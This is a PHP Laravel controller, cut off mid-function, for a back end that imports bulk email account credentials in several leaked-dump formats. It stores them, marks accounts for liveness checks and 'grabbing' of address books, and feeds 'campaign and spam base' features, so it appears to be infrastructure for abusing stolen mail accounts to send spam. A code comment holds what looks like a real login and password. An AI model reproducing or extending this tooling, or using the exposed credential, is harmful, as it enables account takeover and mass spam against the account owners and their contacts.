<?php

namespace App\Http\Controllers\api;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Models\MailAccount;
use App\Models\MailAccountAddressBook;
use App\Models\MailDump;
use App\Models\CampaignAddressbook;
use Carbon\Carbon;
use App\Models\ScanRules;
use lastguest\Murmur;

class EmailAccountsController extends Controller
{
    protected $request;
    protected $test_only;

    public function __construct(Request $request) {
        $this->request = $request;
        $this->test_only = strpos($request->path(), 'mail_accs') !== false ? 0 : 1;
    }
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $accs_group = MailAccount::select('group')->distinct()->get();

        $name = $this->request->input('filter_name');
        $enabled_only = $this->request->input('enabled_only');
        $alive_status = $this->request->input('alive_status');
        $error_status = $this->request->input('error_status');

        $grab_status = $this->request->input('grab_status');

        // $dead_only = $this->request->input('dead_only');
        $has_pop = $this->request->input('has_pop');
        $has_imap = $this->request->input('has_imap');
        $has_smtp = $this->request->input('has_smtp');
        // campaign and spam base specific
        $need_grab_emails = $this->request->input('need_grab_emails');
        $mail_account_ids = $this->request->input('mail_account_ids');
        $mail_account_groups = $this->request->input('mail_account_groups');
        // \Log::debug("EmailAccountsController: mail_account_groups: {$mail_account_groups}");

        $has_mail_dumps = $this->request->input('has_mail_dumps') == 'true';
        // $min_addresses = (int)$this->request->input('min_addresses');
        // $max_addresses = (int)$this->request->input('max_addresses');
        $min_addresses = $this->request->input('min_addresses');
        $max_addresses = $this->request->input('max_addresses');

        // reg - regular, web - web, any - both
        $account_type = $this->request->input('account_type');

        $check_status = $this->request->input('check_status');
        if ( $check_status == 'all' )
            $check_status = null;

        $filters = [
            'filter_name' => $name,
            'enabled_only' => $enabled_only,
            'alive_status' => $alive_status,
            'has_pop' => $has_pop,
            'has_imap' => $has_imap,
            'has_smtp' => $has_smtp,
            // campaign and spam base specific
            'need_grab_emails' => $need_grab_emails,
            'mail_account_ids' => $mail_account_ids,
            'mail_account_groups' => $mail_account_groups,
            'account_type' => $account_type
        ];

        $order_by = $this->request->input('order_by');
        $order_direction = $this->request->input('order_direction');

        if(!empty($order_by) && empty($order_direction)){
            $order_direction = 'desc';
        }

        $per_page = $this->request->input('per_page');
        if(empty($per_page))
            $per_page = 50;
        else
            $per_page = (int)$per_page;

        // pretty shitty filetr builder
        // $data = MailAccount::withCount(['addressbook', 'maildump', 'freshmaildump'])
        $data = MailAccount::withCount(['freshmaildump'])
                    ->where('test_only', $this->test_only)
                    // such complex structure to make WHERE (X OR Y OR Z) and not just WHERE X OR Y
                    ->when(!empty($name), function( $query) use ($name ){
                        return $query->where(function($query) use ($name){
                            return $query->where('smtp_login', 'like', '%'.$name.'%')
                                ->orWhere('smtp_host', 'like', '%'.$name.'%')
                                ->orWhere('name', 'like', '%'.$name.'%');
                        });
                    })
                    ->when(!empty($enabled_only), function( $query){
                        return $query->where('enabled', 1);
                    })
                    ->when(($grab_status != '' && !is_null($grab_status)), function($query) use($grab_status) {
                        return $query->where('need_grab_emails', $grab_status);
                    })
                    ->when(($alive_status != '' && !is_null($alive_status)), function($query) use($alive_status) {
                        return $query->where('alive', $alive_status);
                    })
                    ->when(($error_status != '' && !is_null($error_status)), function($query) use($error_status) {
                        return $query->where('has_errors', $error_status);
                    })
                    ->when(($check_status != '' && !is_null($check_status)), function($query) use($check_status) {
                        return $query->where('check_immediate', $check_status);
                    })
                    ->when(!empty($has_pop), function( $query){
                        return $query->where('pop3_port', '>', 0);
                    })
                    ->when(!empty($has_imap), function( $query){
                        return $query->where('imap_port', '>', 0);
                    })
                    ->when(!empty($has_smtp), function( $query){
                        return $query->where('smtp_port', '>', 0);
                    })
                    ->when(!empty($has_smtp), function( $query){
                        return $query->whereIn('mail_account_ids', $mail_account_ids);
                    })
                    ->when(!empty($need_grab_emails), function( $query){
                        return $query->where('need_grab_emails', $need_grab_emails);
                    })
                    ->when(!empty($mail_account_groups), function( $query) use($mail_account_groups){
                        return $query->whereIn('group', explode(',', $mail_account_groups));
                    })
                    ->when(!empty($has_mail_dumps), function( $query){
                        return $query->has('freshmaildump', '>', 0);
                    })
                    ->when(!is_null($min_addresses), function($query) use($min_addresses){
                        // return $query->has('addressbook', '>=', (int)$min_addresses);
                        return $query->where('addresses', '>=', $min_addresses);
                    })
                    ->when(!is_null($max_addresses), function($query) use($max_addresses){
                        // return $query->has('addressbook', '<=', (int)$max_addresses);
                        return $query->where('addresses', '<=', $max_addresses);
                    })
                    ->when($account_type == 'web', function($query){
                        return $query->where('web_url', '!=', '');
                    })
                    ->when($account_type == 'reg', function($query){
                        return $query->where('web_url', '');
                    })
                    ->when(!empty($mail_account_groups), function( $query) use($mail_account_groups){
                        return $query->whereIn('group', explode(',', $mail_account_groups));
                    })
                    ->when(!empty($order_by), function($query) use ($order_by, $order_direction){
                        return $query->orderBy($order_by, $order_direction);
                    })
                    ->paginate($per_page)->appends($filters);

        return response()->json([
            'success' => true,
            'message' => 'Complete accs list.',
            'data' => $data,
            'groups' => $accs_group
        ]);
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    // parser for first format
    // protocol://login:password@host:port separated by | (with spaces)
    private function storeFormat1($raw_acc, $group_name='general', $need_grab_emails=0)
    {
        $parse_success = false;
        $data = [];

        $proto_keys = array(
            "smtp" => array('smtp_login', 'smtp_password', 'smtp_host', 'smtp_port'),
            "pop3" => array('pop3_login', 'pop3_password', 'pop3_host', 'pop3_port'),
            "imap" => array('imap_login', 'imap_password', 'imap_host', 'imap_port'),
            // incase if imap:// will be somewhy replaceb with imap4://
            "imap4" => array('imap_login', 'imap_password', 'imap_host', 'imap_port')
        );

        $creation_now = Carbon::now();

        // foreach ($unparsed_accs as $raw_acc) {
        // make firstly init
        $data_acc = [
            'smtp_login' => '', 'smtp_password' => '', 'smtp_host' => '', 'smtp_port' => 0,
            'pop3_login' => '', 'pop3_password' => '', 'pop3_host' => '', 'pop3_port' => 0,
            'imap_login' => '', 'imap_password' => '', 'imap_host' => '', 'imap_port' => 0,
            'test_only' => $this->test_only,
            'enabled' => 1, //enable accs by default
            'created_at' => $creation_now,
            'updated_at' => $creation_now,
            'group' => $group_name,
            'need_grab_emails' => $need_grab_emails,
            'from_mail' => '',
            'check_immediate' => 1,
        ];
        // all
        $raw_acc = trim($raw_acc);
        // check for empty string
        if(strlen($raw_acc) < 1 ) return $parse_success;
        // \Log::debug("raw_acc:[{$raw_acc}]");
        $protocols = preg_split("/\s\|\s/", $raw_acc);

        // \Log::debug("protocols:");
        // \Log::debug($protocols);


        foreach ($protocols as $proto) {
            // encapsulate all in groups so that matches array will be more informative
            preg_match_all('/(.{3,5})\:\/\/(.+)[\:|\|](.+)\@(.+)\:(\d{1,5})/', trim($proto), $matches);
            \Log::debug("Pasring:[".trim($proto)."]");
            \Log::debug("Matches:[".json_encode($matches)."]");
            // skip string that can't be parsed or parsed with some errors
            if(count($matches) < 6) {
                $parse_success = false;
                \Log::debug("Protocol parsing give incorrect result for string:[{$proto}]");
                continue 1;
            }

            $proto_key = trim($matches[1][0]);
            // \Log::debug("Parsed protocol:$proto_key");
            if( !array_key_exists( $proto_key, $proto_keys ) ){
                $parse_success = false;
                \Log::debug("Unexpected protocol:[{$proto_key}]");
                continue 1;
            }

            try{
                // fillin fields with parsed values
                // fails to proper insert if row order changes
                $keys = $proto_keys[$proto_key];
                foreach ($keys as $index => $field_name) {
                    $data_acc[$field_name] = trim($matches[$index+2][0]);
                }
            }catch (\Exception $e){
                $parse_success = false;
            }
        }

        // // this check will not work i guess
        // if(count($data_acc) >= 8){
        //     $data[] = $data_acc;
        //     // \Log::debug("data acc:" . json_encode($data_acc) );
        // }else{
        //     \Log::debug("data_acc[$raw_acc] had parsing errors, please check log above");
        //     return $parse_success;
        // }

        // check if at least one of protocols is correct
        if( empty($data_acc['smtp_login']) && empty($data_acc['pop3_login']) && empty($data_acc['imap_login']) ){
            \Log::debug("data_acc[$raw_acc] has no any login.");
            return $parse_success;
        }

        // mark account as disabled, so system can try to get proper login for it
        if($data_acc['smtp_port'] == 0 || $data_acc['pop3_port'] == 0 && $data_acc['imap_port'] == 0){
            \Log::debug("Incomplete data for email smtp, mark as disabled [$raw_acc]");
            $data_acc['enabled'] = 0;
        }

        // try to fill from_mail field
        $data_acc['from_mail'] = $this->generateFromMail($data_acc);

        $data[] = $data_acc;

        // insert time start, need to get duplicates later
        $now = Carbon::now();

        // \Log::debug("data acc:" . json_encode($data) );
        $parse_success = true;
        if( count($data) > 0 ){
            // Eloquent approach standart also ignores timestamps..bitch..
            // MailAccount::insert($data);
            // Extended variant
            MailAccount::insertOnDuplicateKey($data, ['duplicate_insert' => $now]);
        }else{
            $parse_success = false;
        }

        return $parse_success;
    }

    // smtp_host|x|x|x|x|x|x|x|x|x|smtp_login|smtp_password|x|x|x|x|x|x|x|x|x
    private function storeFormat2($raw_acc, $group_name='general', $need_grab_emails=0)
    {
        $data = [];

        $proto_keys = array(
            "smtp" => array('smtp_login', 'smtp_password', 'smtp_host', 'smtp_port'),
            "pop3" => array('pop3_login', 'pop3_password', 'pop3_host', 'pop3_port'),
            "imap" => array('imap_login', 'imap_password', 'imap_host', 'imap_port'),
            // incase if imap:// will be somewhy replaceb with imap4://
            "imap4" => array('imap_login', 'imap_password', 'imap_host', 'imap_port')
        );

        $creation_now = Carbon::now();

        // foreach ($unparsed_accs as $raw_acc) {
        // make firstly init
        $data_acc = [
            'smtp_login' => '', 'smtp_password' => '', 'smtp_host' => '', 'smtp_port' => 0,
            'pop3_login' => '', 'pop3_password' => '', 'pop3_host' => '', 'pop3_port' => 0,
            'imap_login' => '', 'imap_password' => '', 'imap_host' => '', 'imap_port' => 0,
            'test_only' => $this->test_only,
            'enabled' => 0, //disable such accs by default untill i can process them
            'alive' => 1, //mark as alive for partial_accs_checker
            'created_at' => $creation_now,
            'updated_at' => $creation_now,
            'group' => $group_name,
            'need_grab_emails' => $need_grab_emails,
            'from_mail' => '',
            'check_immediate' => 1,
        ];
        // all
        $raw_acc = trim($raw_acc);
        // check for empty string
        if(strlen($raw_acc) < 1 ) return false;

        $splitted = explode("|", $raw_acc); // preg_split("/\|/", $raw_acc);


        //
        $data_acc['smtp_host'] = $splitted[0];
        $data_acc['smtp_login'] = $splitted[10];
        $data_acc['smtp_password'] = $splitted[11];

        // check if beginning of account is pop, if so - update pop_host, pop_login and pop_password
        if( preg_match('/^pop(\d+)?\./', $data_acc['smtp_host']) ){
            $data_acc['pop3_host'] = $splitted[0];
            $data_acc['pop3_login'] = $splitted[10];
            $data_acc['pop3_password'] = $splitted[11];
            // replace pop with smtp
            // $data_acc['smtp_host'] = preg_replace('/^pop(\d+)?\./', 'smtp.', $data_acc['smtp_host']);
        }elseif (preg_match('/^imap(\d+)?\./', $data_acc['smtp_host'])) {
            $data_acc['imap_host'] = $splitted[0];
            $data_acc['imap_login'] = $splitted[10];
            $data_acc['imap_password'] = $splitted[11];

            // $data_acc['smtp_host'] = preg_replace('/^imap(\d+)?\./', 'smtp.', $data_acc['smtp_host']);
        }

        // TODO: also might be following list instead of smtp:
        // smtps smtp2 mail mail2 email smtpout mx1 smtpauth authsmtp webmail smtp3
        // try to fill from_mail field
        $data_acc['from_mail'] = $this->generateFromMail($data_acc);

        $data[] = $data_acc;

        // insert time start, need to get duplicates later
        $now = Carbon::now();

        $res = true;
        // \Log::debug("data acc:" . json_encode($data) );
        if( count($data) > 0 ){
            // Eloquent approach standart also ignores timestamps..bitch..
            // MailAccount::insert($data);
            // Extended variant
            MailAccount::insertOnDuplicateKey($data, ['duplicate_insert' => $now]);
        }else{
            $res = false;
        }

        return $res;
    }

    // host,port,login,pass
    private function storeFormat3($raw_acc, $group_name='general', $need_grab_emails=0)
    {
        $data = [];

        $proto_keys = array(
            "smtp" => array('smtp_login', 'smtp_password', 'smtp_host', 'smtp_port'),
            "pop3" => array('pop3_login', 'pop3_password', 'pop3_host', 'pop3_port'),
            "imap" => array('imap_login', 'imap_password', 'imap_host', 'imap_port'),
            // incase if imap:// will be somewhy replaceb with imap4://
            "imap4" => array('imap_login', 'imap_password', 'imap_host', 'imap_port')
        );

        $creation_now = Carbon::now();

        // foreach ($unparsed_accs as $raw_acc) {
        // make firstly init
        $data_acc = [
            'smtp_login' => '', 'smtp_password' => '', 'smtp_host' => '', 'smtp_port' => 0,
            'pop3_login' => '', 'pop3_password' => '', 'pop3_host' => '', 'pop3_port' => 0,
            'imap_login' => '', 'imap_password' => '', 'imap_host' => '', 'imap_port' => 0,
            'test_only' => $this->test_only,
            'enabled' => 0, //disable such accs by default untill i can process them
            'alive' => 1, //mark as alive for partial_accs_checker
            'created_at' => $creation_now,
            'updated_at' => $creation_now,
            'group' => $group_name,
            'need_grab_emails' => $need_grab_emails,
            'from_mail' => '',
            'check_immediate' => 1,
        ];
        // all
        $raw_acc = trim($raw_acc);
        // check for empty string
        if(strlen($raw_acc) < 1 ) return false;

        $splitted = explode(",", $raw_acc); // preg_split("/\|/", $raw_acc);

        //server,port,login,pass
        $data_acc['smtp_host'] = trim($splitted[0]);
        $data_acc['smtp_port'] = trim($splitted[1]);
        $data_acc['smtp_login'] = trim($splitted[2]);
        // TODO: handle situation when , in password phrase
        $data_acc['smtp_password'] = trim($splitted[3]);

        if( preg_match('/^pop(\d+)?\./', $data_acc['smtp_host']) ){
            $data_acc['pop3_host'] = $splitted[0];
            $data_acc['pop3_port'] = $splitted[1];
            $data_acc['pop3_login'] = $splitted[2];
            $data_acc['pop3_password'] = $splitted[3];
            // remove port, so system try to guess what to do here
            $data_acc['smtp_port'] = 0;
        }elseif (preg_match('/^imap(\d+)?\./', $data_acc['smtp_host'])) {
            $data_acc['imap_host'] = $splitted[0];
            $data_acc['imap_port'] = $splitted[1];
            $data_acc['imap_login'] = $splitted[2];
            $data_acc['imap_password'] = $splitted[3];
            // remove port, so system try to guess what to do here
            $data_acc['smtp_port'] = 0;
        }

        // try to fill from_mail field
        $data_acc['from_mail'] = $this->generateFromMail($data_acc);

        $data[] = $data_acc;

        // insert time start, need to get duplicates later
        $now = Carbon::now();

        $res = true;
        // \Log::debug("data acc:" . json_encode($data) );
        if( count($data) > 0 ){
            // Eloquent approach standart also ignores timestamps..bitch..
            // MailAccount::insert($data);
            // Extended variant
            MailAccount::insertOnDuplicateKey($data, ['duplicate_insert' => $now]);
        }else{
            $res = false;
        }

        return $res;
    }

    // web accounts
    private function storeFormat4($raw_acc, $group_name='general', $need_grab_emails=0)
    {
        $data = [];

        $proto_keys = array(
            "smtp" => array('smtp_login', 'smtp_password', 'smtp_host', 'smtp_port'),
            "pop3" => array('pop3_login', 'pop3_password', 'pop3_host', 'pop3_port'),
            "imap" => array('imap_login', 'imap_password', 'imap_host', 'imap_port'),
            // incase if imap:// will be somewhy replaceb with imap4://
            "imap4" => array('imap_login', 'imap_password', 'imap_host', 'imap_port')
        );

        $creation_now = Carbon::now();

        // foreach ($unparsed_accs as $raw_acc) {
        // make firstly init
        $data_acc = [
            'smtp_login' => '', 'smtp_password' => '', 'smtp_host' => '', 'smtp_port' => 0,
            'pop3_login' => '', 'pop3_password' => '', 'pop3_host' => '', 'pop3_port' => 0,
            'imap_login' => '', 'imap_password' => '', 'imap_host' => '', 'imap_port' => 0,
            'test_only' => $this->test_only,
            'enabled' => 0, //disable such accs by default untill i can process them
            'alive' => 1, //mark as alive for partial_accs_checker
            'created_at' => $creation_now,
            'updated_at' => $creation_now,
            'group' => $group_name,
            'need_grab_emails' => $need_grab_emails,
            'from_mail' => '',
            'check_immediate' => 1,
            'web_url' => '', 'web_login' => '', 'web_password' => '',
        ];
        // all
        $raw_acc = trim($raw_acc);
        // check for empty string
        if(strlen($raw_acc) < 1 ) return false;

        $splitted = explode("|", $raw_acc); // preg_split("/\|/", $raw_acc);

        //server,port,login,pass
        $data_acc['web_url'] = trim($splitted[0]);
        $data_acc['web_login'] = trim($splitted[1]);
        $data_acc['web_password'] = trim($splitted[2]);

        $data_acc['smtp_login'] = Murmur::hash3("web_acc:".$data_acc['web_url'].$data_acc['web_login']);

        // try to fill from_mail field
        $data_acc['from_mail'] = $data_acc['web_login'];

        $data[] = $data_acc;

        // insert time start, need to get duplicates later
        $now = Carbon::now();

        $res = true;
        // \Log::debug("data acc:" . json_encode($data) );
        if( count($data) > 0 ){
            // Eloquent approach standart also ignores timestamps..bitch..
            // MailAccount::insert($data);
            // Extended variant
            MailAccount::insertOnDuplicateKey($data, ['duplicate_insert' => $now]);
        }else{
            $res = false;
        }

        return $res;
    }

    // host:port:login:password
    // login:password:host:port
    // TODO: will be dumb fuck with ip, fix it
    private function storeFormat5($raw_acc, $group_name='general', $need_grab_emails=0)
    {
        $data = [];

        $proto_keys = array(
            "smtp" => array('smtp_login', 'smtp_password', 'smtp_host', 'smtp_port'),
            "pop3" => array('pop3_login', 'pop3_password', 'pop3_host', 'pop3_port'),
            "imap" => array('imap_login', 'imap_password', 'imap_host', 'imap_port'),
            // incase if imap:// will be somewhy replaceb with imap4://
            "imap4" => array('imap_login', 'imap_password', 'imap_host', 'imap_port')
        );

        $creation_now = Carbon::now();

        // foreach ($unparsed_accs as $raw_acc) {
        // make firstly init
        $data_acc = [
            'smtp_login' => '', 'smtp_password' => '', 'smtp_host' => '', 'smtp_port' => 0,
            'pop3_login' => '', 'pop3_password' => '', 'pop3_host' => '', 'pop3_port' => 0,
            'imap_login' => '', 'imap_password' => '', 'imap_host' => '', 'imap_port' => 0,
            'test_only' => $this->test_only,
            'enabled' => 0, //disable such accs by default untill i can process them
            'alive' => 1, //mark as alive for partial_accs_checker
            'created_at' => $creation_now,
            'updated_at' => $creation_now,
            'group' => $group_name,
            'need_grab_emails' => $need_grab_emails,
            'from_mail' => '',
            'check_immediate' => 1,
        ];
        // all
        $raw_acc = trim($raw_acc);
        // check for empty string
        if(strlen($raw_acc) < 1 ) return false;

        $splitted = explode(":", $raw_acc); // preg_split("/\|/", $raw_acc);
        // /(.+\.[a-z0-9]{2,5})\:(\d{0,3})\:(.+\@.+\.[a-z0-9]{2,5})\:(.+)/gmi

        if( preg_match('/(.+\.[a-z0-9]{2,5})\:(\d{0,3})\:(.+\@.+\.[a-z0-9]{2,5})\:(.+)?/', $raw_acc)){
            // host:port:login:pass
            $data_acc['smtp_host'] = trim($splitted[0]);
            $data_acc['smtp_port'] = trim($splitted[1]);
            $data_acc['smtp_login'] = trim($splitted[2]);
            $data_acc['smtp_password'] = trim($splitted[3]);
        }elseif (preg_match('/(.+\@.+\.[a-z0-9]{2,5})\:(.+)?\:(.+\.[a-z0-9]{2,5})\:\d{0,5}/', $raw_acc)){
            //login:pass:host:port
            $data_acc['smtp_host'] = trim($splitted[2]);
            $data_acc['smtp_port'] = trim($splitted[3]);
            $data_acc['smtp_login'] = trim($splitted[0]);
            $data_acc['smtp_password'] = trim($splitted[1]);
        }

        if( preg_match('/^pop(\d+)?\./', $data_acc['smtp_host']) ){
            $data_acc['pop3_host'] = $data_acc['smtp_host'];
            $data_acc['pop3_port'] = $data_acc['smtp_port'];
            $data_acc['pop3_login'] = $data_acc['smtp_login'];
            $data_acc['pop3_password'] = $data_acc['smtp_password'];
            // remove port, so system try to guess what to do here
            $data_acc['smtp_port'] = 0;
        }elseif (preg_match('/^imap(\d+)?\./', $data_acc['smtp_host'])) {
            $data_acc['imap_host'] = $data_acc['smtp_host'];
            $data_acc['imap_port'] = $data_acc['smtp_port'];
            $data_acc['imap_login'] = $data_acc['smtp_login'];
            $data_acc['imap_password'] = $data_acc['smtp_password'];
            // remove port, so system try to guess what to do here
            $data_acc['smtp_port'] = 0;
        }

        // try to fill from_mail field
        $data_acc['from_mail'] = $this->generateFromMail($data_acc);

        $data[] = $data_acc;

        // insert time start, need to get duplicates later
        $now = Carbon::now();

        $res = true;
        // \Log::debug("data acc:" . json_encode($data) );
        if( count($data) > 0 ){
            // Eloquent approach standart also ignores timestamps..bitch..
            // MailAccount::insert($data);
            // Extended variant
            MailAccount::insertOnDuplicateKey($data, ['duplicate_insert' => $now]);
        }else{
            $res = false;
        }

        return $res;
    }

    // host:port,login:password
    //
    private function storeFormat6($raw_acc, $group_name='general', $need_grab_emails=0)
    {
        $data = [];

        $proto_keys = array(
            "smtp" => array('smtp_login', 'smtp_password', 'smtp_host', 'smtp_port'),
            "pop3" => array('pop3_login', 'pop3_password', 'pop3_host', 'pop3_port'),
            "imap" => array('imap_login', 'imap_password', 'imap_host', 'imap_port'),
            // incase if imap:// will be somewhy replaceb with imap4://
            "imap4" => array('imap_login', 'imap_password', 'imap_host', 'imap_port')
        );

        $creation_now = Carbon::now();

        // foreach ($unparsed_accs as $raw_acc) {
        // make firstly init
        $data_acc = [
            'smtp_login' => '', 'smtp_password' => '', 'smtp_host' => '', 'smtp_port' => 0,
            'pop3_login' => '', 'pop3_password' => '', 'pop3_host' => '', 'pop3_port' => 0,
            'imap_login' => '', 'imap_password' => '', 'imap_host' => '', 'imap_port' => 0,
            'test_only' => $this->test_only,
            'enabled' => 0, //disable such accs by default untill i can process them
            'alive' => 1, //mark as alive for partial_accs_checker
            'created_at' => $creation_now,
            'updated_at' => $creation_now,
            'group' => $group_name,
            'need_grab_emails' => $need_grab_emails,
            'from_mail' => '',
            'check_immediate' => 1,
        ];
        // all
        $raw_acc = trim($raw_acc);
        // check for empty string
        if(strlen($raw_acc) < 1 ) return false;

        // $splitted = explode(":", $raw_acc); // preg_split("/\|/", $raw_acc);
        // mail.orangevfx.com:587,david@orangevfx.com:Setting1
        $splitted_general = explode(",", $raw_acc);

        // host port
        $splitted = explode(":", $splitted_general[0]);

        //login:pass:host:port
        $data_acc['smtp_host'] = trim($splitted[0]);
        $data_acc['smtp_port'] = trim($splitted[1]);
        // login password
        $splitted = explode(":", $splitted_general[1]);
        $data_acc['smtp_login'] = trim($splitted[0]);
        // TODO: handle situation when , in password phrase
        $data_acc['smtp_password'] = trim($splitted[1]);

        if( preg_match('/^pop(\d+)?\./', $data_acc['smtp_host']) ){
            $data_acc['pop3_host'] = $data_acc['smtp_host'];
            $data_acc['pop3_port'] = $data_acc['smtp_port'];
            $data_acc['pop3_login'] = $data_acc['smtp_login'];
            $data_acc['pop3_password'] = $data_acc['smtp_password'];
            // remove port, so system try to guess what to do here
            $data_acc['smtp_port'] = 0;
        }elseif (preg_match('/^imap(\d+)?\./', $data_acc['smtp_host'])) {
            $data_acc['imap_host'] = $data_acc['smtp_host'];
            $data_acc['imap_port'] = $data_acc['smtp_port'];
            $data_acc['imap_login'] = $data_acc['smtp_login'];
            $data_acc['imap_password'] = $data_acc['smtp_password'];
            // remove port, so system try to guess what to do here
            $data_acc['smtp_port'] = 0;
        }

        // try to fill from_mail field
        $data_acc['from_mail'] = $this->generateFromMail($data_acc);

        $data[] = $data_acc;

        // insert time start, need to get duplicates later
        $now = Carbon::now();

        $res = true;
        // \Log::debug("data acc:" . json_encode($data) );
        if( count($data) > 0 ){
            // Eloquent approach standart also ignores timestamps..bitch..
            // MailAccount::insert($data);
            // Extended variant
            MailAccount::insertOnDuplicateKey($data, ['duplicate_insert' => $now]);
        }else{
            $res = false;
        }

        return $res;
    }



    private function generateFromMail($record){
        $logins = array('web_login', 'smtp_login', 'pop3_login', 'imap_login');
        $common_login = "";
        foreach ($logins as $key => $value) {
            if(!empty( $record[$value] )){
                $common_login = $record[$value];
                break;
            }
        }

        # check if we got some dumb fuck values instead of @ => #, %,+
        $match = preg_match("/\S+(\#|\%|\+)\S+\.\S+/", $common_login);
        if( $match === true ){
            $common_login = preg_replace("/(\#|\%|\+)/", '@', $common_login);
        }

        if(strpos($common_login, "@") === false){
            $hosts = array('smtp_host', 'pop3_host', 'imap_host');

            foreach ($hosts as $hkey => $hvalue) {
                if(!empty( $record[$hvalue] )){
                    $domain = preg_split("/(smtp(\d+)?\.|pop(\d+)?\.|imap(\d+)?\.)/", $record[$hvalue]);
                    $new_host = end($domain);
                    if( $new_host === false )
                    {
                        $new_host = $record[$hvalue];
                    }else{
                        $spl = explode(".", $new_host);
                        if(count($spl) > 1){
                            // get last 2 items, so only domain + subdomain
                            $spl2 = array_slice($spl, -2);
                            $spl2 = implode(".", $spl2);
                            $new_host = $spl2;
                        }
                    }
                    $common_login = $common_login . "@" . $new_host;
                    break;
                }
            }
        }

        return $common_login;
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store()
    {
        //
        $data = [];
        // get data from request field
        $raw_data = $this->request->input('acc_list');
        $unparsed_accs = explode("\n", $raw_data);

        // get data from request file_list
        if(!empty($this->request->file_list)){
            \Log::debug( "EmailAccountsController: processing file records:");
            foreach ($this->request->file_list as $file) {
                $filepath = $file->path();
                $addrs_raw = file_get_contents($filepath);
                $items = explode("\n", $addrs_raw);
                $unparsed_accs = array_merge($unparsed_accs, $items);
            }
        }

        $group_name = $this->request->input('group_name');
        if( empty($group_name))
            $group_name = 'general';

        $need_grab_emails = $this->request->input('need_grab_emails');
        if (empty($need_grab_emails))
            $need_grab_emails = 0;

        // fromat:
        // one account per string
        // protocols a divided by | symbol
        // account format: proto://login:password@host:port
        // IMPORTANT: login can also contain @ symbol

        // format2:
        // one account per string
        // smtp_host|smtp_port|x|x|x|x|x|x|x|x|smtp_login|smtp_password|x|x|x|x|x|x|x|x|x
        // however, we have no shit info for imap/pop3, so system should "guess" what to do with that type of account

        // format3:
        // one account per string
        // server,port,login,pass
        // AMS format

        // insert time start, need to get duplicates later
        $now = Carbon::now();

        $dupes = [];
        $failed = [];
        // scan every acc for format
        foreach ($unparsed_accs as $raw_acc) {
            $dupe = null;
            // // skip empty strings i guess
            // if( strlen($raw_acc) < 1)
            //     continue;

            \Log::debug("EmailAccountsController count of | delimeters:" . substr_count($raw_acc,"|"));
            if(  preg_match('/^(smtp|imap|pop3?)\:\/\/(.+)[\:|\|](.+)?\@(.+)\:(\d{1,5})?/', $raw_acc) ){
                try {
                    $res = $this->storeFormat1($raw_acc, $group_name, $need_grab_emails);
                } catch (\Exception $e) {
                    \Log::error("EmailAccountsController parse string of type: 1 error:$raw_acc\n". $e->getMessage());
                    \Log::error("EmailAccountsController stack trace:\n" . $e->getTraceAsString());
                    $res = false;
                }
            }elseif(substr_count($raw_acc,"|") > 15 ){
                try {
                    $res = $this->storeFormat2($raw_acc, $group_name, $need_grab_emails);
                } catch (\Exception $e) {
                    \Log::error("EmailAccountsController parse string of type: 2 error:$raw_acc\n". $e->getMessage());
                    \Log::error("EmailAccountsController stack trace:\n" . $e->getTraceAsString());
                    $res = false;
                }
            }elseif (substr_count($raw_acc,",") >= 3 ) {
                try {
                    $res = $this->storeFormat3($raw_acc, $group_name, $need_grab_emails);
                } catch (\Exception $e) {
                    \Log::error("EmailAccountsController parse string of type: 3 error:$raw_acc\n". $e->getMessage());
                    \Log::error("EmailAccountsController stack trace:\n" . $e->getTraceAsString());
                    $res = false;
                }
            }elseif (substr_count($raw_acc,":") >= 3 ) {
                try{
                    $res = $this->storeFormat5($raw_acc, $group_name, $need_grab_emails);
                } catch (\Exception $e) {
                    \Log::error("EmailAccountsController parse string of type: 5 error:$raw_acc\n". $e->getMessage());
                    \Log::error("EmailAccountsController stack trace:\n" . $e->getTraceAsString());
                    $res = false;
                }
            }elseif (substr_count($raw_acc,":") == 2 && substr_count($raw_acc,",") == 1 ) {
                try{
                    $res = $this->storeFormat6($raw_acc, $group_name, $need_grab_emails);
                } catch (\Exception $e) {
                    \Log::error("EmailAccountsController parse string of type: 6 error:$raw_acc\n". $e->getMessage());
                    \Log::error("EmailAccountsController stack trace:\n" . $e->getTraceAsString());
                    $res = false;
                }
            // }elseif (substr_count($raw_acc,"|") <= 3 ) {
            }elseif (preg_match('/^https?\:\/\/(\w+)\.\w{2,6}(\S+)?(\s+)?\|(\s+)?(\S+)(\s)?\|(\s)?(\S+)/', $raw_acc) ){
                try{
                    $res = $this->storeFormat4($raw_acc, $group_name, $need_grab_emails);
                } catch (\Exception $e) {
                    \Log::error("EmailAccountsController parse string of type: 4 error:$raw_acc\n". $e->getMessage());
                    \Log::error("EmailAccountsController stack trace:\n" . $e->getTraceAsString());
                    $res = false;
                }
            }else{
                try{
                    $res = $this->storeFormat1($raw_acc, $group_name, $need_grab_emails);
                } catch (\Exception $e) {
                    \Log::error("EmailAccountsController parse string of type: 1 error:$raw_acc\n". $e->getMessage());
                    \Log::error("EmailAccountsController stack trace:\n" . $e->getTraceAsString());
                    $res = false;
                }
            }

            if(!$res){
                $failed[] = $raw_acc;
            }
        }



        // get duplicates:
        $dupes = MailAccount::where('duplicate_insert', '<=', $now)->get();

        $ret_data = [
            'success' => true,
            'message' => 'Accounts are inserted. Email extractin process will start shortly.',
            'duplicates' => $dupes,
            'failed' => $failed
        ];


        if(!empty($failed)){
            $ret_data['message'] .= "<br>However, system could not process some of strings, they remain in your text area.";
        }


        return response()->json($ret_data);
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update($id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }

    public function massUpdate()
    {
        $action = $this->request->input('option');
        $ids = $this->request->input('ids');

        // $socksTable = (new MailAccount())->getTable();
        if( $action == 'enable' ){
            MailAccount::whereIn('id', $ids)->update(array('enabled' => 1));
        }elseif( $action == 'disable' ){
